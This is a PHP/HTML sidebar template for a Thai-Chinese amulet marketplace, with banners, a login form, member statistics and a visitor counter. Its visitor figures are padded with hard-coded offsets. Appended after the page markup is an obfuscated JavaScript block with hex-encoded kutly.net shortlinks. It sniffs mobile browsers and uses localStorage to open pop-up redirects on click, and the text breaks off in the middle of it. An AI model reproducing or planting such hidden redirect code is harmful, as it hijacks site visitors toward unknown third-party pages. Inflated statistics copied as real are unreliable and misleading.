<?php
	// check data expired
	$queryagelife = mysql_query("select * from banner order by order_num asc");
	while ($resultagelife = mysql_fetch_array($queryagelife)) {
		if($resultagelife['banner_day'] != "infinity"){
			$age_life = strtotime($resultagelife['banner_expired'])-time();
			if($age_life <= 0){
				mysql_query("update banner set banner_active = 'noshow' where banner_id = '".$resultagelife['banner_id']."' ");
			}
		}
	}
?>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/th_TH/sdk.js#xfbml=1&version=v2.5&appId=142198835797158";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<table width="1000" border="0" cellspacing="0" cellpadding="0">
		<tr>
			<td valign="top" width="181">
					<table width="181" border="0" cellspacing="0" cellpadding="0">
						<tr>
								<td align="center" style="background: #D8C290;" height="50" >
										<!-- <span class='st_facebook_hcount' displayText='Facebook'></span> 
										<span class='st_fblike_hcount' displayText='Facebook Like'></span> -->
										<div class="fb-share-button" data-href="http://<?php echo $_SERVER['SERVER_NAME'];?>" data-layout="button_count"></div>
										<div class="fb-like" data-href="http://<?php echo $_SERVER['SERVER_NAME'];?>" data-layout="button_count" data-action="like" data-show-faces="true" data-share="false"></div>
								</td>
						</tr>
											<tr>
												<td align="center" style="background: #D8C290; padding-bottom:5px; padding-top:5px" >
														<a href="text_card.php">
															<table width="158" border="0" cellspacing="0" cellpadding="0">
																	<tr>
																		<td height="70" align="center" style="background-color:#FC0"><span style="color:#000; font-weight:bold">บัตรรับรองพระเครื่อง</span><br />
																				<span style="color:#000; font-weight:bold; font-size:14px">praasia </span>
																		</td>
																	</tr>
															</table>
														</a>
												</td>
											</tr>                        
						<tr>
								<td height="1165" valign="top" style="background: #D4B684;">
									<table width="100%" border="0" cellspacing="0" cellpadding="3">
											<tr>
                                            	<td align="center">
                                                	<form action="certificate.php" method="post">
                                                	<table width="170" border="0" cellspacing="0" cellpadding="0">
                                                      <tr>
                                                        <td bgcolor="#FFCC00" style="color:#000; padding:5px; line-height:20px; font-size:14px" align="center" height="100">ตรวจสอบบัตรรับรอง<br />พระเครื่อง <strong>พระเอเซีย</strong><br /><input type="text" placeholder="กรอกเลขบัตรรับรอง" name="cert_code" style="width:98%" /><br /><input type="submit" value="ค้นหา" /></td>
                                                      </tr>
                                                    </table>
                                                    </form>
                                                </td>
                                            </tr>
                                            <tr>
												<td>
														<a href="http://track.thailandpost.co.th/" target="_blank">
															<table width="150" height="100" align="center" cellpadding="0" cellspacing="0">
																	<tr>
																		<td align="center" valign="top" style="background:url(images/post.jpg) no-repeat">
																				&nbsp; 
																				<!-- <form name="frmPage" action="http://track.thailandpost.co.th/trackinternet/Result.aspx" method="post" target="_blank" onSubmit="return check()">
																					<table border="0" cellpadding="0" cellspacing="0" style="margin-top:95px">
																					<tr>
																					<td >
																					<input id="IDItemID" size="14" name="ItemID" class="INPUT">
																					</td>
																					</tr>
																					<tr>
																					<td align="center" >
																					<input value="default.asp" name="PageName" type="hidden">
																					<input value="Search" name="Submit"  type="submit">
																					</td>
																					</tr>
																					<tr>
																					<td height="30"   >
																					<a href="http://track.thailandpost.co.th/" target="_blank">
																					รายละเอียดเพิ่มเติม</a>            
																					</td>
																					</tr>
																					</table></form>-->
																		</td>
																	</tr>
															</table>
														</a>
												</td>
											</tr>
											<tr>
												<td align="center">
														<a href="policy.php">
															<table width="158" border="0" cellspacing="0" cellpadding="0">
																	<tr>
																		<td height="70" align="center" bgcolor="#CC0000"><span style="color:#FFF; font-weight:bold">กติกาการใช้งานเว็บไซต์</span><br />
																				<span style="color:#FC0; font-weight:bold; font-size:14px">www.praasia.com </span>
																		</td>
																	</tr>
															</table>
														</a>
												</td>
											</tr>
											<tr>
												<td align="center"><img src="images/callcenter.jpg"/></td>
											</tr>
											<tr>
												<td align="center">
														<a href="http://translate.google.com" target="_blank">
															<table width="150">
																	<tr>
																		<td align="center" bgcolor="#FFFFFF"><img src="images/Google-Translate-Logo.jpg" width="110" height="110" border="0" /></td>
																	</tr>
															</table>
														</a>
												</td>
											</tr>
											<tr>
												<td align="center">
														<a href="https://www.paypal.com/th/cgi-bin/webscr?cmd=_flow&SESSION=RZQ3zpmVuncW5NCKci-56L55WdWYJv88ZK50ZiE7-0jcbU98_xN_jsQVr8C&dispatch=5885d80a13c0db1f8e263663d3faee8db315373d882600b51a5edf961ea39639" style="color:#000" target="_blank">
															<table width="150">
																	<tr>
																		<td align="center" bgcolor="#FFFFFF"> สมัคร <br/>
																				注册 <br/>
																				<img src="images/paypal-logo.png" width="100" height="53" border="0" />
																		</td>
																	</tr>
															</table>
														</a>
												</td>
											</tr>
											<tr>
												<td align="center">
														<a href="http://www.youtube.com/watch?v=ItioGaG_7XE" target="_blank">
															<table width="150" border="0" cellspacing="0" cellpadding="3">
																	<tr>
																		<td align="center" bgcolor="#FFFFFF" style="color:#000">วีธีการใช้งาน <br />
																				<img src="images/paypal-s.jpg" width="150" height="42" border="0"/>
																		</td>
																	</tr>
															</table>
														</a>
												</td>
											</tr>
											<tr>
												<td align="center">
														<a href="http://m.youtube.com/watch?v=uUxgk6f3cbE" target="_blank">
															<table width="150" border="0" cellspacing="0" cellpadding="3">
																	<tr>
																		<td align="center" bgcolor="#FFFFFF" style="color:#000"> 如何使用 <br />
																				<img src="images/paypal-s.jpg" width="150" height="42" border="0"/>
																		</td>
																	</tr>
															</table>
														</a>
												</td>
											</tr>
											<tr>
												<td align="center">
														<table width="150" border="0" cellspacing="0" cellpadding="3">
															<tr>
																	<td align="center" bgcolor="#FFFFFF" style="font-size:12px">CALL CENTER PAYPAL<br />
																		PayPal 服务中心<br />
																		+6565905502<br />
																		074-262615
																	</td>
															</tr>
														</table>
												</td>
											</tr>
											<tr>
												<td align="center">
														<table width="150" border="0" cellspacing="0" cellpadding="3">
															<tr>
																	<td align="center" bgcolor="#FFFFFF" style="font-size:12px">
																		<a href="package.php" style="color: black;">
																			<br>
																			<br>
																			PACEKATE ร้านค้า  
																			<br>
																			<br>
																			<br>
																		</a>
																	</td>
															</tr>
														</table>
												</td>
											</tr>
									</table>
								</td>
						</tr>
					</table>
			</td>
			<td width="445" valign="top" bgcolor="#000000">
					<table width="445" border="0" cellspacing="0" cellpadding="0">
						<tr>
								<td><img src="images/bgbannerinfo.jpg" width="445" height="35" /></td>
						</tr>
						<tr>
								<td bgcolor="#000000" style="padding-left:15px">
									<style type="text/css">
											#banner-center{
												margin: 0;
												padding: 0;
												list-style: none;
											}
											#banner-center li{
												margin: 0;
												padding: 6px 0;
											}
											#banner-center li a{
												margin: 0;
												padding: 0;
											}
										</style>
										<ul id="banner-center">
										<?php 
											$q="SELECT * FROM `banner` WHERE banner_pos = 'C' AND banner_active = 'show' ORDER BY order_num ASC Limit  0,10";
											$dbbanner= new nDB();
											$dbbanner->query($q);
											while($dbbanner->next_record()){
												if($dbbanner->f(banner_url)==''){
													$url="detail_banner.php?banner_id=".$dbbanner->f(banner_id);
													$tar=$dbbanner->f(banner_target);
													if($tar=='1'){
															$target="_Blank";
													}else{
															$target="_parent";
													}
												}else{
													$url=$dbbanner->f(banner_url);
												}
											?>
											<li>
												<a href="<?=$url?>" target="<?=$target?>">
													<img width="400" height="112" src="/img/banner/<?=$dbbanner->f(banner_img)?>" alt="<?=$dbbanner->f(banner_img)?>" border="0">
												</a>
											</li>
										<?php } ?>
										</ul>
								</td>
						</tr>
					</table>
			</td>
			<td width="374" valign="top">
					<table width="100%" border="0" cellspacing="0" cellpadding="0">
						<tr>
								<td height="1275" style="background:url(images/bgrightmenu.jpg) no-repeat" valign="top">
									<table width="100%" border="0" cellspacing="0" cellpadding="0">
											<?php
												if( $_SESSION['adminshop_id'] == '' || !isset($_SESSION['adminshop_id']) ){
												?>
											<tr>
												<td height="190" valign="top">
														<form action="chk_login.php" method="post" name="REG" target="p_wb" id="REG">
															<table width="320" border="0" align="right" cellpadding="3" cellspacing="0">
																	<tr>
																		<td height="29" colspan="2" align="center" style="background:url(images/bh-login.png) no-repeat right; padding-left:30px"><span style="color:#391700; font-size:14px; font-weight:bold"> เข้าสู่ระบบ / 登录 </span></td>
																	</tr>
																	<tr>
																		<td width="45%" height="30" align="right" style="color:#3d2602; font-size:14px;"> username / 帐号 : </td>                                                                        </td>
																		<td width="55%"><input name="username" type="text" class="input" id="username" style="width:140px" /></td>
																	</tr>
																	<tr>
																		<td height="30" align="right" style="color:#3d2602; font-size:14px;"> password / 密码 : </td>
																		<td><input name="password" type="password" class="input" id="password" style="width:140px" /></td>
																	</tr>
																	<tr>
																		<td colspan="2" align="center"><a href="forget_password.php"> <span style="color:#3d2602; font-size:14px; font-weight:bold"> ลืมรหัสผ่าน / 忘记密码 </span> </a>
																				<!-- <input type="hidden" name="click_login" value="login_index">  -->
																			<input name="Login" type="submit" id="Login" value="เข้าสู่ระบบ / 登录" />
																		</td>
																	</tr>
																	<iframe src="" name="p_wb" width="0px" height="0px" frameborder="0" id="p_wb"></iframe>
															</table>
														</form>
												</td>
											</tr>
											<? } else { ?>
											<tr>
												<td height="190">
														<table width="320" border="0" align="right" cellpadding="0" cellspacing="0">
															<?php
																	$q="SELECT * FROM `member` WHERE id = '".$_SESSION['adminshop_id']."' ";
																	$dbshop= new nDB();
																	$dbshop->query($q);              
																	$dbshop->next_record();
																	?>
															<tr>
																	<td width="100%" height="29" align="center" style="background:url(images/bh-login.png) no-repeat;  padding-left:30px"><span style="color:#391700; font-size:14px; font-weight:bold">เข้าสู่ระบบ / 登录</span></td>
															</tr>
															<tr>
																	<td>
																		<table width="100%" border="0" cellspacing="0" cellpadding="3">
																				<tr>
																					<td width="8%" align="right">&nbsp;</td>
																					<td width="92%" class="detail-text"> ยินดีต้อนรับคุณ /欢迎光临 :
																							<?=$dbshop->f(name)?>
																					</td>
																				</tr>
																				<?php
																					if($dbshop->f(type) == "0"){
																					?>
																				<tr>
																					<td align="right">&nbsp;</td>
																					<td style="color:#3d2602"><a href="backend.php" style="color:#3d2602; font-size:14px;">ระบบจัดการร้านค้า / 商店系统编辑区</a></td>
																				</tr>
																				<tr>
																					<td align="right">&nbsp;</td>
																					<td style="color:#3d2602"><a href="shop_index.php?shop=<?=$dbshop->f(id)?>" style="color:#3d2602; font-size:14px;">เข้าสู่หน้าร้านค้า / 进入首页商店</a></td>
																				</tr>
																				<?php
																					}else{
																					?>
																				<tr>
																					<td align="right">&nbsp;</td>
																					<td style="color:#3d2602"><img src="img_profile/<?=$dbshop->f('pic1')?>" height="30px" align="center"/> <a href="member_profile.php?member_id=<?=$dbshop->f(id)?>" style="color:#3d2602; font-size:14px;">โปรไฟล์ส่วนตัว / 个人资料设置</a></td>
																				</tr>
																				<?php
																					}
																					?>
                                                                                <tr>
                                                                                	<td align="right">&nbsp;</td>
                                                                                    <td><a href="check_certificate_doc.php?username=<?=$dbshop->f(username)?>" target="_blank"><span style="color:#930; font-size:14px">ตรวจสอบการออกบัตรรับรองของคุณ / 检查自己的鉴定项目资料</span></a></td>
                                                                                </tr>   
																				<tr>
																					<td align="right">&nbsp;</td>
																					<td><a href="logout.php"><span style="color:#F00">ออกจากระบบ / 退出系统</span></a></td>
																				</tr>
																		</table>
																	</td>
															</tr>
														</table>
												</td>
											</tr>
											<? } ?>
											<tr>
												<td>
														<table width="320" border="0" align="right" cellpadding="0" cellspacing="0">
															<tr>
																	<td height="29" align="center" style="background:url(images/bh-login.png) no-repeat right;  padding-left:30px"><span style="color:#391700; font-size:14px; font-weight:bold"> สถิติร้านค้า / 統計 </span></td>
															</tr>
															<tr>
																	<td style="padding-left:9px">
																		<table width="300" border="0" cellspacing="0" cellpadding="0">
																				<tr>
																					<td>
																							<table width="95%" border="0" align="center" cellpadding="3" cellspacing="0">
																								<?php
																										$q = "SELECT * FROM `member` WHERE 1 ";
																										$rowshop = new nDB();  
																										$rowshop->query($q);
																										$rowshop->next_record();
																										$num_shop = $rowshop->num_rows();
																										?>
																								<tr>
																										<td width="68%" align="left"><span style="color:#3d2602"> สมาชิกทั้งหมด / 总共会员 :
																											<?=number_format($num_shop)?></span>
																										</td>
																								</tr>
																								<?php
																										$q = "SELECT * FROM `product` WHERE 1 ";
																										$rowproduct = new nDB(); 
																										$rowproduct->query($q);
																										$rowproduct->next_record();
																										$num_product = $rowproduct->num_rows();
																										?>
																								<tr>
																										<td align="left"><span style="color:#3d2602">สินค้าทั้งหมด  / 总共商品 :
																											<?= number_format($num_product)?></span>
																										</td>
																								</tr>
																								<?
																										/*
																										Counter Information
																										
																										Website: http://www.free-php-counter.com/
																										Version: Text version
																										
																										Installation help:
																										
																										http://www.free-php-counter.com/text-counter.php
																										
																										
																										You like to remove the link on the counter? Click here and get an link free license:
																										
																										http://www.free-php-counter.com/adfree_counter.php
																										*/
																										
																										
																										// edit counter settings here
																										
																										
																										// absolut path to the folder containing counter.php and counter.gif (????????? / ???????????)
																										// use $_SERVER['DOCUMENT_ROOT'] . "/" when the counter is in root dir
																										/* use <? echo dirname($_SERVER['SCRIPT_FILENAME']) . "/"; ?> to get absolute path */
																								$counter_path_absolut = dirname($_SERVER['SCRIPT_FILENAME'])."/";
																								// http path to the folder containing counter.php and counter.gif (????????? / ???????????)
																								// set http://www.your-homepage.com/ when the counter is in root dir
																								$counter_path_http = "http://www.praasia.com/";
																								// IP-lock in seconds
																								$counter_expire = 600;
																								// do not edit from here
																								$counter_filename = $counter_path_absolut . "counter.txt";
																								if (file_exists($counter_filename)) 
																								{
																								$ignore = false;
																								$current_agent = (isset($_SERVER['HTTP_USER_AGENT'])) ? addslashes(trim($_SERVER['HTTP_USER_AGENT'])) : "no agent";
																								$current_time = time();
																								$current_ip = $_SERVER['REMOTE_ADDR']; 
																								// daten einlesen
																								$c_file = array();
																								$handle = fopen($counter_filename, "r");
																								if ($handle)
																								{
																								while (!feof($handle)) 
																								{
																								$line = trim(fgets($handle, 4096)); 
																								if ($line != "")
																								$c_file[] = $line;      
																								}
																								fclose ($handle);
																								}
																								else
																								$ignore = true;
																								// bots ignorieren   
																								if (substr_count($current_agent, "bot") > 0)
																								$ignore = true;
																								// hat diese ip einen eintrag in den letzten expire sec gehabt, dann igornieren?
																								for ($i = 1; $i < sizeof($c_file); $i++)
																								{
																								list($counter_ip, $counter_time) = explode("||", $c_file[$i]);
																								$counter_time = trim($counter_time);
																								if ($counter_ip == $current_ip && $current_time-$counter_expire < $counter_time)
																								{
																								// besucher wurde bereits gez?hlt, daher hier abbruch
																								$ignore = true;
																								break;
																								}
																								}
																								// counter hochz?hlen
																								if ($ignore == false)
																								{
																								if (sizeof($c_file) == 0)
																								{
																								// wenn counter leer, dann f?llen      
																								$add_line1 = date("z") . ":1||" . (date("z")-1) . ":0||" . date("W") . ":1||" . date("n") . ":1||" . date("Y") . ":1||1||1||" . $current_time . "\n";
																								$add_line2 = $current_ip . "||" . $current_time . "\n";
																								// daten schreiben
																								$fp = fopen($counter_filename,"w+");
																								if ($fp)
																								{
																								flock($fp, LOCK_EX);
																								fwrite($fp, $add_line1);
																								fwrite($fp, $add_line2);
																								flock($fp, LOCK_UN);
																								fclose($fp);
																								}
																								// werte zur verf?gung stellen
																								$day = $yesterday = $week = $month = $year = $all = $record = 1;
																								$record_time = $current_time;
																								$online = 1;
																								}
																								else
																								{
																								// counter hochz?hlen
																								list($day_arr, $yesterday_arr, $week_arr, $month_arr, $year_arr, $all, $record, $record_time) = explode("||", $c_file[0]);
																								$day_data = explode(":", $day_arr);
																								$yesterday_data = explode(":", $yesterday_arr);
																								// yesterday
																								$yesterday = $yesterday_data[1];
																								if ($day_data[0] == (date("z")-1)) 
																								{
																								$yesterday = $day_data[1]; 
																								}
																								else
																								{
																								if ($yesterday_data[0] != (date("z")-1))
																								{
																								$yesterday = 0; 
																								}
																								}
																								// day
																								$day = $day_data[1];
																								if ($day_data[0] == date("z")) $day++; else $day = 1;
																								// week
																								$week_data = explode(":", $week_arr);
																								$week = $week_data[1];
																								if ($week_data[0] == date("W")) $week++; else $week = 1;
																								// month
																								$month_data = explode(":", $month_arr);
																								$month = $month_data[1];
																								if ($month_data[0] == date("n")) $month++; else $month = 1;
																								// year
																								$year_data = explode(":", $year_arr);
																								$year = $year_data[1];
																								if ($year_data[0] == date("Y")) $year++; else $year = 1;
																								// all
																								$all++;
																								// neuer record?
																								$record_time = trim($record_time);
																								if ($day > $record)
																								{
																								$record = $day;
																								$record_time = $current_time;
																								}
																								// speichern und aufr?umen und anzahl der online leute bestimmten
																								$online = 1;
																								// daten schreiben
																								$fp = fopen($counter_filename,"w+");
																								if ($fp)
																								{
																								flock($fp, LOCK_EX);
																								$add_line1 = date("z") . ":" . $day . "||" . (date("z")-1) . ":" . $yesterday . "||" . date("W") . ":" . $week . "||" . date("n") . ":" . $month . "||" . date("Y") . ":" . $year . "||" . $all . "||" . $record . "||" . $record_time . "\n";     
																								fwrite($fp, $add_line1);
																								for ($i = 1; $i < sizeof($c_file); $i++)
																								{
																								list($counter_ip, $counter_time) = explode("||", $c_file[$i]);
																								// ?bernehmen
																								if ($current_time-$counter_expire < $counter_time)
																								{
																								$counter_time = trim($counter_time);
																								$add_line = $counter_ip . "||" . $counter_time . "\n";
																								fwrite($fp, $add_line);
																								$online++;
																								}
																								}
																								$add_line = $current_ip . "||" . $current_time . "\n";
																								fwrite($fp, $add_line);
																								flock($fp, LOCK_UN);
																								fclose($fp);
																								}
																								}
																								}
																								else
																								{
																								// nur zum anzeigen lesen
																								if (sizeof($c_file) > 0)
																								list($day_arr, $yesterday_arr, $week_arr, $month_arr, $year_arr, $all, $record, $record_time) = explode("||", $c_file[0]);
																								else
																								list($day_arr, $yesterday_arr, $week_arr, $month_arr, $year_arr, $all, $record, $record_time) = explode("||", date("z") . ":1||" . (date("z")-1) . ":0||" .  date("W") . ":1||" . date("n") . ":1||" . date("Y") . ":1||1||1||" . $current_time);
																								// day
																								$day_data = explode(":", $day_arr);
																								$day = $day_data[1];
																								// yesterday
																								$yesterday_data = explode(":", $yesterday_arr);
																								$yesterday = $yesterday_data[1];
																								// week
																								$week_data = explode(":", $week_arr);
																								$week = $week_data[1];
																								// month
																								$month_data = explode(":", $month_arr);
																								$month = $month_data[1];
																								// year
																								$year_data = explode(":", $year_arr);
																								$year = $year_data[1];
																								$record_time = trim($record_time);
																								$online = sizeof($c_file) - 1;
																								}
																								?>
																								<tr>
																										<td align="left"><span style="color:#3d2602"> ออนไลน์ขณะนี้ / 在线访客 : <? echo number_format(($online*2)+220); ?></span></td>
																								</tr>
																								<?php
																										$q = "SELECT * FROM `counter` order by id desc limit 1";
																										$counter = new nDB();
																										$counter->query($q);
																										$counter->next_record();
																										?>
																								<tr>
																										<td align="left"><span style="color:#3d2602"> จำนวนผู้เข้าชมวันนี้ / 今天坊客 : <span style="color:#3d2602">
																											<?= number_format($counter->f(counter)+13500)?></span> </span>
																										</td>
																								</tr>
																								<tr>
																										<td align="left">
																											<?php
																													$qview = "SELECT * FROM `counter`";
																													$counterview = new nDB();
																													$counterview->query($qview);
																													while ($counterview->next_record()) {
																													$totalviw += $counterview->f(counter);
																													}
																													?>
																											<span style="color:#3d2602"> จำนวนผู้เข้าชมทั้งหมด / 总共坊客 : <span style="color:#3d2602">
																											<?=number_format($totalviw)?></span> </span>
																										</td>
																								</tr>
																								<tr>
																										<td align="left"><span style="color:#FC0"> เปิดวันที่ 9/9/2556 /   开店日期 2013 年 9月 9日 </span></td>
																								</tr>
																								<?php
																										}
																										?>
																							</table>
																					</td>
																				</tr>
																		</table>
																	</td>
															</tr>
														</table>
												</td>
											</tr>
											<tr>
												<td height="70px">&nbsp;</td>
											</tr>
											<tr>
												<td style="padding-left:25px; padding-top:15px">
														<style type="text/css">
															#banner-right{
																margin: 0;
																padding: 0;
																list-style: none;
															}
															#banner-right li{
																margin: 0;
																padding: 3px 0;
															}
															#banner-right li a{
																margin: 0;
																padding: 0;
															}
														</style>
														<ul id="banner-right">
														<?php 
															$q="SELECT * FROM `banner` WHERE banner_pos = 'B' AND banner_active = 'show' ORDER BY order_num Limit  0,10";
															$dbbanner= new nDB();
															$dbbanner->query($q);
															while($dbbanner->next_record()){;
															?>
														<?
															if($dbbanner->f(banner_url)==''){
																	$url="detail_banner.php?banner_id=".$dbbanner->f(banner_id);
																	$tar=$dbbanner->f(banner_target);
																	if($tar=='1'){
																			$target="_Blank";
																	}else{
																			$target="_parent";
																	}
															}else{
																	$url=$dbbanner->f(banner_url);
															}
															?>
															<li>
																<a href="<?=$url?>" target="<?=$target?>">
																	<img width="290" height="82" src="/img/banner/<?=$dbbanner->f(banner_img)?>" alt="<?=$dbbanner->f(banner_img)?>" border="0">
																</a>
															</li>
														<?php } ?>
														</ul>
												</td>
											</tr>
									</table>
								</td>
						</tr>
					</table>
			</td>
		</tr>
</table>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return 